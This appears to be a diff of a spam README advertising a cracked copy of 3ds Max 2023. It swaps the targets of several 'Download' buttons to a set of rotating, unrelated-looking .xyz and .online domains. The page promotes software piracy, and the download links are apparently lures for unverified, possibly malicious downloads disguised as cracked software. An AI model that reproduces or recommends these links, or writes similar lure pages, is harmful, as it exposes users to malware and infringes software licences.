@@ -4,7 +4,7 @@ Unleash the power of innovation with **3d studio max crack**, a cutting-edge sol
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://mossllrun.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -37,7 +37,7 @@ Ready to dive deeper into **3dsmax 2023 crack**? Explore more today!
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
+<a href='https://opertomst.online?store=3d-max'><img src='assets/images/software/images/buttons/3.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -87,7 +87,7 @@ Ready to experience the unmatched security and reliability of **3ds max 2023 cra
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/2.jpg' alt='Download' width='200'/></a>
+<a href='https://mercolupoz.xyz?store=3d-max'><img src='assets/images/software/images/buttons/2.jpg' alt='Download' width='200'/></a>
 
 </div>
 
@@ -113,6 +113,6 @@ Ready to experience the power of **3dsmax 2023 crack**? Get started today!
 
 <div align='center'>
 
-<a href='https://opertomst.online?store=3d Max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
+<a href='https://kerbrtonoped.xyz?store=3d-max'><img src='assets/images/software/images/buttons/4.jpg' alt='Download' width='200'/></a>
 
 </div>
